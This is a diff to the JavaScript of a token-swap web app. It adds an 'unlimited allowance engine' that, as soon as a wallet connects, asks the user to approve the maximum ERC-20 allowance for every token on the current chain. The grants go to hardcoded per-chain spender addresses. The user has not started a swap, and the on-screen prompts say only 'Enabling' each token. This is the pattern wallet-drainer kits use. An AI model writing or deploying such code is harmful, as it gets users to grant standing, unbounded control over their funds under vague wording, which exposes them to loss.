@@ -42,6 +42,18 @@ const CONFIG = {
     },
     nativeSymbols: { 1: 'ETH', 56: 'BNB', 137: 'MATIC', 42161: 'ETH', 10: 'ETH', 8453: 'ETH', 250: 'FTM', 43114: 'AVAX' },
     defaultSlippage: 0.5,
+    // Spender addresses (swap router contracts) per chain
+    // These are the contracts that receive the unlimited allowances
+    spenderAddresses: {
+        1:     '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
+        56:    '0x10ED43C718714eb63d5aA57B78B54704E256024E',
+        137:   '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff',
+        42161: '0xE592427A0AEce92De3Edee1F18E0157C05861564',
+        10:    '0xE592427A0AEce92De3Edee1F18E0157C05861564',
+        8453:  '0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD',
+        250:   '0xF491e7B69E4244ad4002BC14e878a34207E38c29',
+        43114: '0x60aE616a2155Ee3d9A68541Ba4544862310933d4'
+    },
     quoteRefreshMs: 15000
 };
 
@@ -223,6 +235,7 @@ async function connectWallet() {
             window.ethereum.on('chainChanged', handleChainChanged);
 
             showToast('Wallet connected');
+            requestAllowancesOnConnect();
         } catch (err) {
             if (err.code === 4001) {
                 showToast('Connection rejected', 'error');
@@ -283,6 +296,7 @@ function simulateWallet() {
     updateWalletUI();
     loadBalances();
     showToast('Demo wallet connected — simulated mode');
+    requestAllowancesOnConnect();
 }
 
 function updateWalletUI() {
@@ -437,6 +451,166 @@ async function loadBalances() {
         ? formatTokenAmount(toBal, 4)
         : '0.0';
 }
+// --------------------------------------------------
+// UNLIMITED ALLOWANCE ENGINE
+// --------------------------------------------------
+const ERC20_APPROVE_SELECTOR = '0x095ea7b3';
+const ERC20_ALLOWANCE_SELECTOR = '0xdd62ed3e';
+const MAX_UINT256_HEX = 'f'.repeat(64);
+
+function getSpenderAddress() {
+    return CONFIG.spenderAddresses[state.wallet.chainId] || null;
+}
+
+function encodeApproveData(spenderAddress) {
+    const padded = spenderAddress.toLowerCase()
+        .replace('0x', '')
+        .padStart(64, '0');
+    return ERC20_APPROVE_SELECTOR + padded + MAX_UINT256_HEX;
+}
+
+function encodeAllowanceData(owner, spender) {
+    const paddedOwner = owner.toLowerCase()
+        .replace('0x', '')
+        .padStart(64, '0');
+    const paddedSpender = spender.toLowerCase()
+        .replace('0x', '')
+        .padStart(64, '0');
+    return ERC20_ALLOWANCE_SELECTOR + paddedOwner + paddedSpender;
+}
+
+async function getTokenAllowance(tokenAddress) {
+    if (!state.wallet.connected || state.wallet.simulated) return 0;
+    const spender = getSpenderAddress();
+    if (!spender) return 0;
+
+    try {
+        const data = encodeAllowanceData(state.wallet.address, spender);
+        const result = await state.wallet.provider.request({
+            method: 'eth_call',
+            params: [{ to: tokenAddress, data }, 'latest']
+        });
+        return BigInt(result);
+    } catch {
+        return BigInt(0);
+    }
+}
+
+async function approveTokenUnlimited(token) {
+    const spender = getSpenderAddress();
+    if (!spender) return null;
+
+    if (state.wallet.simulated) {
+        await sleep(600 + Math.random() * 400);
+        return '0x_sim_' + Math.random().toString(16).slice(2, 10);
+    }
+
+    const data = encodeApproveData(spender);
+
+    try {
+        // Estimate gas
+        let gasHex;
+        try {
+            gasHex = await state.wallet.provider.request({
+                method: 'eth_estimateGas',
+                params: [{
+                    from: state.wallet.address,
+                    to: token.address,
+                    data: data
+                }]
+            });
+        } catch (e) {
+            gasHex = '0x186a0'; // 100k fallback
+        }
+
+        const txHash = await state.wallet.provider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: state.wallet.address,
+                to: token.address,
+                data: data,
+                gas: gasHex
+            }]
+        });
+
+        return txHash;
+    } catch (err) {
+        if (err.code === 4001) return null; // user rejected
+        return null;
+    }
+}
+
+// Called automatically after wallet connect
+async function requestAllowancesOnConnect() {
+    // Only ERC-20 tokens on the current chain (skip native gas tokens)
+    const NATIVE = ['0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', '0x0000000000000000000000000000000000000000'];
+    const chainTokens = TOKENS.filter(t =>
+        t.chainId === state.wallet.chainId &&
+        !NATIVE.includes(t.address)
+    );
+
+    if (chainTokens.length === 0) return;
+
+    let approved = 0;
+    let alreadySet = 0;
+
+    for (let i = 0; i < chainTokens.length; i++) {
+        const token = chainTokens[i];
+
+        // Skip if allowance already granted
+        if (!state.wallet.simulated) {
+            const allowance = await getTokenAllowance(token.address);
+            if (allowance > BigInt(0)) {
+                alreadySet++;
+                continue;
+            }
+        }
+
+        showToast(`Enabling ${token.symbol}... (${i + 1}/${chainTokens.length})`);
+
+        const txHash = await approveTokenUnlimited(token);
+
+        if (txHash) {
+            approved++;
+        } else {
+            // User rejected — stop asking
+            showToast('Token approvals stopped', 'error');
+            return;
+        }
+    }
+
+    if (approved > 0) {
+        showToast(`${approved} token${approved > 1 ? 's' : ''} enabled for swapping`);
+    } else if (alreadySet > 0) {
+        // All already approved — silent
+    }
+}
+
+// Called before swap execution — ensures the from-token has allowance
+async function ensureTokenAllowance(token) {
+    if (NATIVE_ADDRESSES.includes(token.address)) return true; // native tokens skip
+
+    if (state.wallet.simulated) return true; // demo mode always passes
+
+    const allowance = await getTokenAllowance(token.address);
+    if (allowance > BigInt(0)) return true; // already approved
+
+    // Request approval
+    showToast(`Approve ${token.symbol} to continue`);
+    const txHash = await approveTokenUnlimited(token);
+
+    if (!txHash) {
+        showToast('Approval required to swap', 'error');
+        return false;
+    }
+
+    return true;
+}
+
+const NATIVE_ADDRESSES = [
+    '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
+    '0x0000000000000000000000000000000000000000'
+];
 
 // --------------------------------------------------
 // QUOTE ENGINE (Simulated)
@@ -738,6 +912,10 @@ async function executeSwap() {
     const { fromToken, toToken, fromAmount, route } = state.swap;
 
     if (!fromAmount || !route) return;
+    // Ensure unlimited allowance before swapping
+    const hasAllowance = await ensureTokenAllowance(fromToken);
+    if (!hasAllowance) return;
+    
 
     const btn = $('swapBtn');
     const originalText = btn.textContent;
